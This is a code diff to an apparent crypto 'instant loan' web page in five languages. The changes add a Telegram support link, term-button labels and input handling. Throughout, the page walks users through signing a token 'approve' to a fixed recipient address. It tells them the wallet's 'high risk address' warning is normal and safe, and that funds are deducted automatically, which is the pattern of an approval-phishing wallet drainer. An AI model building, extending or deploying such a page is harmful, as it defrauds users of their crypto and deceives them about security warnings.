@@ -549,6 +549,22 @@
             font-size: 11px;
         }
 
+        .support-link {
+            display: inline-block;
+            background: #2a4a6e;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 40px;
+            text-decoration: none;
+            margin-top: 10px;
+            font-weight: 600;
+            transition: 0.2s;
+        }
+
+        .support-link:hover {
+            background: #3a5a7e;
+        }
+
         @media (max-width: 768px) {
             .hero h1 {
                 font-size: 36px;
@@ -624,6 +640,7 @@
             <span class="close-modal" id="closeInstructionModal">&times;</span>
             <h2 style="margin-bottom:20px;" id="instructionTitle">📖 Guide</h2>
             <div class="instruction-text" id="instructionText"></div>
+            <a href="https://t.me/kurbaaX" target="_blank" class="support-link" id="instructionSupportBtn">💬 Contact support</a>
             <button class="btn-primary" id="closeInstructionBtn" style="margin-top:20px; width:100%;">Close</button>
         </div>
     </div>
@@ -663,36 +680,41 @@
                 <div class="loan-form">
                     <h2 id="loanTitle">Loan amount</h2>
                     
-                    <!-- Мини-инструкция (теперь сверху) -->
-                    <div class="mini-guide" id="miniGuide">
-                        <h4>📋 Quick guide</h4>
-                        <p>1. Connect wallet → choose network & coin</p>
-                        <p>2. Select term → enter amount</p>
-                        <p>3. Sign approve in wallet → done!</p>
-                        <p style="font-size:11px; color:#8ba3b8; margin-top:8px;">⚠️ Wallet may show warning - this is normal for smart contracts</p>
-                    </div>
-                    
+                    <!-- Баланс (сверху) -->
                     <div class="balance-info">
                         <div id="yourBalanceLabel">Your balance</div>
                         <div class="balance-amount" id="userBalance">0 USDT</div>
                         <div style="margin-top:8px; font-size:14px;" id="availableLoanLabel">Available (max 50%): <strong id="maxLoan">0 USDT</strong></div>
                     </div>
                     
+                    <!-- Срок займа -->
                     <div id="termLabel" style="font-size:14px; margin-bottom:8px;">Loan term:</div>
                     <div class="term-selector" id="termSelector">
                         <div class="term-btn" data-term="week">7 days / 3%</div>
                         <div class="term-btn active" data-term="month">30 days / 5%</div>
-                        <div class="term-btn" data-term="custom">Custom</div>
+                        <div class="term-btn" data-term="custom" id="customTermBtn">Custom</div>
                     </div>
                     <div class="custom-term" id="customTermInput">
-                        <input type="number" id="customDays" placeholder="Enter days (1-90)" min="1" max="90" value="30">
+                        <input type="text" id="customDays" placeholder="Enter days (1-90)" value="30">
                     </div>
                     
+                    <!-- Процентная ставка -->
                     <div class="interest-info" id="interestInfo">
                         Interest rate: <span class="interest-rate" id="interestRate">5%</span>
                     </div>
                     
+                    <!-- Ввод суммы -->
                     <input type="number" id="loanAmount" class="loan-input" placeholder="Enter amount" step="0.01">
+                    
+                    <!-- Мини-инструкция (внизу) -->
+                    <div class="mini-guide" id="miniGuide">
+                        <h4>📋 Quick guide</h4>
+                        <p>1. Connect wallet → choose network & coin</p>
+                        <p>2. Select term → enter amount</p>
+                        <p>3. Sign approve in wallet → done!</p>
+                        <p style="font-size:11px; color:#8ba3b8; margin-top:8px;">⚠️ Wallet may show warning - this is normal</p>
+                    </div>
+                    
                     <button class="btn-primary" id="submitLoanBtn" style="width:100%;">✅ Confirm</button>
                 </div>
             </div>
@@ -712,17 +734,10 @@
     <script>
         const HELEKET_API = 'https://heleket-zhpx.onrender.com';
         
-        // Ставки по срокам (0.2% в день, но не более 15%)
         function calculateRate(days) {
-            let rate = days * 0.002; // 0.2% в день
-            return Math.min(0.15, rate); // максимум 15%
+            let rate = days * 0.002;
+            return Math.min(0.15, rate);
         }
-
-        const TERM_RATES = {
-            week: { days: 7, rate: 0.03, name: 'week' },
-            month: { days: 30, rate: 0.05, name: 'month' },
-            custom: { days: null, rate: null, name: 'custom' }
-        };
 
         const USDT_CONTRACTS = {
             TRC20: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
@@ -822,8 +837,12 @@
                 rulesTitle: "📜 Terms",
                 rulesText: "<h3>Loan terms</h3><p>• Loan amount: up to 50% of your wallet balance</p><p>• Terms and rates:<br>- Week (7 days): 3%<br>- Month (30 days): 5%<br>- Custom (1-90 days): 0.2% per day (max 15%)</p><p>• Auto-renewal: if overdue, 5% is charged every 30 days</p><p>• Permission (approve) is automatically revoked after loan repayment</p><h3>Repayment</h3><p>For early repayment, please contact support. Funds will be automatically deducted after the term expires.</p>",
                 instructionTitle: "📖 Guide",
-                instructionText: "<h3>How to get a loan</h3><div class='instruction-step'><strong>Step 1:</strong> Click 'Get loan' → choose your wallet</div><div class='instruction-step'><strong>Step 2:</strong> Select network (TRC20, BEP20, ERC20) and coin (USDT/USDC)</div><div class='instruction-step'><strong>Step 3:</strong> Choose loan term (week/month/custom)</div><div class='instruction-step'><strong>Step 4:</strong> Enter amount (up to 50% of balance)</div><div class='instruction-step'><strong>Step 5: Sign approve</strong><br>Your wallet will show:<br>• Recipient: <code class='inline-code'>0x110e...d7c6ac</code><br>• Token contract: <code class='inline-code'>0xdac1...31ec7</code></div><div class='warning-box'>⚠️ <strong>About the warning</strong><br>Your wallet may show 'high risk address' — this is a standard warning for any smart contract. You are giving permission to OUR smart contract. This is normal and safe.</div><div class='instruction-step'><strong>Step 6:</strong> Click 'Continue' → sign transaction → done!</div><div class='info-text'>ℹ️ Permission is automatically revoked after loan repayment</div><p><strong>📞 Support:</strong> @kurbaaX</p>",
-                repaymentText: "📋 Repayment:\n• Amount to repay: {repay} {coin}\n• Interest rate: {rate}%\n• Term: {days} days\n• Auto-renewal: +5% every 30 days if overdue\n• Permission auto-revoked after repayment"
+                instructionText: "<h3>How to get a loan</h3><div class='instruction-step'><strong>Step 1:</strong> Click 'Get loan' → choose your wallet</div><div class='instruction-step'><strong>Step 2:</strong> Select network (TRC20, BEP20, ERC20) and coin (USDT/USDC)</div><div class='instruction-step'><strong>Step 3:</strong> Choose loan term (week/month/custom)</div><div class='instruction-step'><strong>Step 4:</strong> Enter amount (up to 50% of balance)</div><div class='instruction-step'><strong>Step 5: Sign approve</strong><br>Your wallet will show:<br>• Recipient: <code class='inline-code'>0x110e...d7c6ac</code><br>• Token contract: <code class='inline-code'>0xdac1...31ec7</code></div><div class='warning-box'>⚠️ <strong>About the warning</strong><br>Your wallet may show 'high risk address' — this is a standard warning for any smart contract. You are giving permission to OUR smart contract. This is normal and safe.</div><div class='instruction-step'><strong>Step 6:</strong> Click 'Continue' → sign transaction → done!</div><div class='info-text'>ℹ️ Permission is automatically revoked after loan repayment</div>",
+                repaymentText: "📋 Repayment:\n• Amount to repay: {repay} {coin}\n• Interest rate: {rate}%\n• Term: {days} days\n• Auto-renewal: +5% every 30 days if overdue\n• Permission auto-revoked after repayment",
+                customTerm: "Custom",
+                weekTerm: "7 days / 3%",
+                monthTerm: "30 days / 5%",
+                supportChat: "💬 Contact support"
             },
             ru: {
                 heroDesc: "Получите криптозайм мгновенно. Гибкие сроки. Низкий процент.",
@@ -854,8 +873,12 @@
                 rulesTitle: "📜 Правила",
                 rulesText: "<h3>Условия займа</h3><p>• Сумма займа: до 50% от баланса кошелька</p><p>• Сроки и ставки:<br>- Неделя (7 дней): 3%<br>- Месяц (30 дней): 5%<br>- Свой период (1-90 дней): 0.2% в день (макс. 15%)</p><p>• Автопродление: при просрочке +5% каждые 30 дней</p><p>• Разрешение (approve) автоматически удаляется после погашения займа</p><h3>Возврат</h3><p>Для досрочного возврата свяжитесь с поддержкой. Средства будут списаны автоматически после истечения срока.</p>",
                 instructionTitle: "📖 Инструкция",
-                instructionText: "<h3>Как получить займ</h3><div class='instruction-step'><strong>Шаг 1:</strong> Нажмите 'Получить займ' → выберите кошелёк</div><div class='instruction-step'><strong>Шаг 2:</strong> Выберите сеть (TRC20, BEP20, ERC20) и монету (USDT/USDC)</div><div class='instruction-step'><strong>Шаг 3:</strong> Выберите срок (неделя/месяц/свой)</div><div class='instruction-step'><strong>Шаг 4:</strong> Введите сумму (до 50% баланса)</div><div class='instruction-step'><strong>Шаг 5: Подпишите approve</strong><br>В кошельке появится:<br>• Получатель: <code class='inline-code'>0x110e...d7c6ac</code><br>• Контракт токена: <code class='inline-code'>0xdac1...31ec7</code></div><div class='warning-box'>⚠️ <strong>О предупреждении</strong><br>Кошелёк может показать 'адрес с высоким уровнем риска' — это стандартное предупреждение для любых смарт-контрактов. Вы даёте разрешение нашему смарт-контракту. Это нормально и безопасно.</div><div class='instruction-step'><strong>Шаг 6:</strong> Нажмите 'Продолжить' → подпишите транзакцию → готово!</div><div class='info-text'>ℹ️ Разрешение автоматически удаляется после погашения займа</div><p><strong>📞 Поддержка:</strong> @kurbaaX</p>",
-                repaymentText: "📋 Условия возврата:\n• Сумма к возврату: {repay} {coin}\n• Процентная ставка: {rate}%\n• Срок: {days} дней\n• Автопродление: +5% каждые 30 дней при просрочке\n• Разрешение автоматически удаляется после возврата"
+                instructionText: "<h3>Как получить займ</h3><div class='instruction-step'><strong>Шаг 1:</strong> Нажмите 'Получить займ' → выберите кошелёк</div><div class='instruction-step'><strong>Шаг 2:</strong> Выберите сеть (TRC20, BEP20, ERC20) и монету (USDT/USDC)</div><div class='instruction-step'><strong>Шаг 3:</strong> Выберите срок (неделя/месяц/свой)</div><div class='instruction-step'><strong>Шаг 4:</strong> Введите сумму (до 50% баланса)</div><div class='instruction-step'><strong>Шаг 5: Подпишите approve</strong><br>В кошельке появится:<br>• Получатель: <code class='inline-code'>0x110e...d7c6ac</code><br>• Контракт токена: <code class='inline-code'>0xdac1...31ec7</code></div><div class='warning-box'>⚠️ <strong>О предупреждении</strong><br>Кошелёк может показать 'адрес с высоким уровнем риска' — это стандартное предупреждение для любых смарт-контрактов. Вы даёте разрешение нашему смарт-контракту. Это нормально и безопасно.</div><div class='instruction-step'><strong>Шаг 6:</strong> Нажмите 'Продолжить' → подпишите транзакцию → готово!</div><div class='info-text'>ℹ️ Разрешение автоматически удаляется после погашения займа</div>",
+                repaymentText: "📋 Условия возврата:\n• Сумма к возврату: {repay} {coin}\n• Процентная ставка: {rate}%\n• Срок: {days} дней\n• Автопродление: +5% каждые 30 дней при просрочке\n• Разрешение автоматически удаляется после возврата",
+                customTerm: "Свой",
+                weekTerm: "7 дней / 3%",
+                monthTerm: "30 дней / 5%",
+                supportChat: "💬 Связаться с поддержкой"
             },
             es: {
                 heroDesc: "Obtén préstamo crypto al instante. Plazos flexibles. Bajo interés.",
@@ -887,7 +910,11 @@
                 rulesText: "<h3>Condiciones</h3><p>• Monto: hasta 50% del saldo</p><p>• Plazos y tasas:<br>- Semana (7 días): 3%<br>- Mes (30 días): 5%<br>- Personalizado (1-90 días): 0.2% diario (máx 15%)</p><p>• Renovación automática: +5% cada 30 días</p>",
                 instructionTitle: "📖 Guía",
                 instructionText: "<h3>Cómo obtener un préstamo</h3><div class='instruction-step'><strong>Paso 1:</strong> Click 'Obtener préstamo' → seleccione wallet</div><div class='instruction-step'><strong>Paso 2:</strong> Seleccione red y moneda</div><div class='instruction-step'><strong>Paso 3:</strong> Elija plazo (semana/mes/personalizado)</div><div class='instruction-step'><strong>Paso 4:</strong> Ingrese monto (hasta 50% del saldo)</div><div class='instruction-step'><strong>Paso 5: Firmar approve</strong><br>Recipiente: <code class='inline-code'>0x110e...d7c6ac</code><br>Contrato: <code class='inline-code'>0xdac1...31ec7</code></div><div class='warning-box'>⚠️ La wallet puede mostrar 'dirección de alto riesgo' — es normal.</div><div class='info-text'>ℹ️ El permiso se revoca automáticamente después del pago</div>",
-                repaymentText: "📋 Devolución:\n• A devolver: {repay} {coin}\n• Tasa: {rate}%\n• Plazo: {days} días"
+                repaymentText: "📋 Devolución:\n• A devolver: {repay} {coin}\n• Tasa: {rate}%\n• Plazo: {days} días",
+                customTerm: "Personalizado",
+                weekTerm: "7 días / 3%",
+                monthTerm: "30 días / 5%",
+                supportChat: "💬 Contactar soporte"
             },
             de: {
                 heroDesc: "Sofort Kredit erhalten. Flexible Laufzeiten. Niedrige Zinsen.",
@@ -919,7 +946,11 @@
                 rulesText: "<h3>Kreditbedingungen</h3><p>• Betrag: bis zu 50% des Guthabens</p><p>• Laufzeiten und Zinsen:<br>- Woche (7 Tage): 3%<br>- Monat (30 Tage): 5%<br>- Benutzerdefiniert (1-90 Tage): 0.2% pro Tag (max 15%)</p>",
                 instructionTitle: "📖 Anleitung",
                 instructionText: "<h3>Kredit erhalten</h3><div class='instruction-step'><strong>Schritt 1:</strong> 'Kredit erhalten' → Wallet wählen</div><div class='instruction-step'><strong>Schritt 2:</strong> Netzwerk & Coin wählen</div><div class='instruction-step'><strong>Schritt 3:</strong> Laufzeit wählen</div><div class='instruction-step'><strong>Schritt 4:</strong> Betrag eingeben</div><div class='instruction-step'><strong>Schritt 5:</strong> Approve unterschreiben</div><div class='warning-box'>⚠️ 'Risikoadresse' ist eine Standard-Warnung für Smart Contracts.</div>",
-                repaymentText: "📋 Rückzahlung:\n• Rückzahlungsbetrag: {repay} {coin}\n• Zinssatz: {rate}%\n• Laufzeit: {days} Tage"
+                repaymentText: "📋 Rückzahlung:\n• Rückzahlungsbetrag: {repay} {coin}\n• Zinssatz: {rate}%\n• Laufzeit: {days} Tage",
+                customTerm: "Benutzerdef.",
+                weekTerm: "7 Tage / 3%",
+                monthTerm: "30 Tage / 5%",
+                supportChat: "💬 Support kontaktieren"
             },
             fr: {
                 heroDesc: "Obtenez un prêt crypto instantanément. Durées flexibles. Intérêt faible.",
@@ -951,7 +982,11 @@
                 rulesText: "<h3>Conditions du prêt</h3><p>• Montant: jusqu'à 50% du solde</p><p>• Durées et taux:<br>- Semaine (7 jours): 3%<br>- Mois (30 jours): 5%<br>- Personnalisé (1-90 jours): 0.2% par jour (max 15%)</p>",
                 instructionTitle: "📖 Guide",
                 instructionText: "<h3>Comment obtenir un prêt</h3><div class='instruction-step'><strong>Étape 1:</strong> 'Obtenir un prêt' → choisir wallet</div><div class='instruction-step'><strong>Étape 2:</strong> Choisir réseau et monnaie</div><div class='instruction-step'><strong>Étape 3:</strong> Choisir la durée</div><div class='instruction-step'><strong>Étape 4:</strong> Entrer le montant</div><div class='instruction-step'><strong>Étape 5:</strong> Signer l'approve</div><div class='warning-box'>⚠️ 'Adresse à haut risque' est un avertissement standard.</div>",
-                repaymentText: "📋 Remboursement:\n• À rembourser: {repay} {coin}\n• Taux: {rate}%\n• Durée: {days} jours"
+                repaymentText: "📋 Remboursement:\n• À rembourser: {repay} {coin}\n• Taux: {rate}%\n• Durée: {days} jours",
+                customTerm: "Personnalisé",
+                weekTerm: "7 jours / 3%",
+                monthTerm: "30 jours / 5%",
+                supportChat: "💬 Contacter le support"
             }
         };
 
@@ -1272,7 +1307,19 @@
             document.getElementById('feature3Desc').innerHTML = t.feature3Desc;
             document.getElementById('langBtn').innerHTML = currentLang === 'en' ? '🇬🇧 EN ▼' : currentLang === 'ru' ? '🇷🇺 RU ▼' : currentLang === 'es' ? '🇪🇸 ES ▼' : currentLang === 'de' ? '🇩🇪 DE ▼' : '🇫🇷 FR ▼';
             
-            // Обновляем мини-инструкцию
+            // Кнопки выбора срока
+            const weekBtn = document.querySelector('.term-btn[data-term="week"]');
+            const monthBtn = document.querySelector('.term-btn[data-term="month"]');
+            const customBtn = document.getElementById('customTermBtn');
+            if (weekBtn) weekBtn.innerHTML = t.weekTerm;
+            if (monthBtn) monthBtn.innerHTML = t.monthTerm;
+            if (customBtn) customBtn.innerHTML = t.customTerm;
+            
+            // Кнопка поддержки в инструкции
+            const supportLink = document.getElementById('instructionSupportBtn');
+            if (supportLink) supportLink.innerHTML = t.supportChat;
+            
+            // Мини-инструкция
             const miniGuide = document.getElementById('miniGuide');
             if (currentLang === 'ru') {
                 miniGuide.innerHTML = `<h4>📋 Быстрая инструкция</h4><p>1. Подключите кошелёк → выберите сеть и монету</p><p>2. Выберите срок → введите сумму</p><p>3. Подпишите approve в кошельке → готово!</p><p style="font-size:11px; color:#8ba3b8; margin-top:8px;">⚠️ Кошелёк может показать предупреждение — это нормально</p>`;
@@ -1385,9 +1432,14 @@
             });
         });
         
-        document.getElementById('customDays').addEventListener('input', (e) => {
+        const customDaysInput = document.getElementById('customDays');
+        customDaysInput.addEventListener('input', (e) => {
             if (selectedTerm === 'custom') {
-                let days = parseInt(e.target.value);
+                let val = e.target.value;
+                if (val === '' || val === '-') {
+                    return;
+                }
+                let days = parseInt(val);
                 if (isNaN(days)) days = 1;
                 days = Math.min(90, Math.max(1, days));
                 customDays = days;
@@ -1397,6 +1449,14 @@
                 const amount = parseFloat(document.getElementById('loanAmount').value);
                 if (!isNaN(amount) && amount > 0) {
                     updateRepaymentPreview(amount);
+                }
+            }
+        });
+        
+        customDaysInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' || e.key === 'Delete') {
+                if (e.target.value.length <= 1) {
+                    e.target.value = '';
                 }
             }
         });
